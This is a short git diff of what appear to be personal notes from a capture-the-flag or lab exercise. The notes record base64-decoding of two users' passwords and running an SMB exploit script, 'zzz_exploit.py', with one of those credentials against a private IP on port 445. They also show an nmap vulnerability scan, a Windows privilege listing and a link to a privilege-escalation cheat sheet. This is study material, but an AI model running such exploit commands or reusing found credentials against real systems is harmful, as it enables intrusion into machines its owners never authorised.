@@ -71,13 +71,15 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 ┌──(root💀lucy)-[/home/gd/Desktop]
 └─# echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
 
-
 Bob - !P@$$W0rD!123
                                                                                                    
 ┌──(root💀lucy)-[/home/gd/Desktop]
 └─# echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
 Bill - Juw4nnaM4n420696969!$$$ 
-python zzz_exploit.py --target-ip 10.10.23.25 -port 445 'Bob:!P@$$W0rD-'
+
+python zzz_exploit.py --target-ip 10.10.23.25 -port 445 'Bob:!P@$$W0rD123'
+... error
+
 
 sudo nmap --script vuln -p 135,139,445 10.10.50.94
 sudo: unable to resolve host lucy: Name or service not known
@@ -172,6 +174,8 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration
+
 
 
 google.com
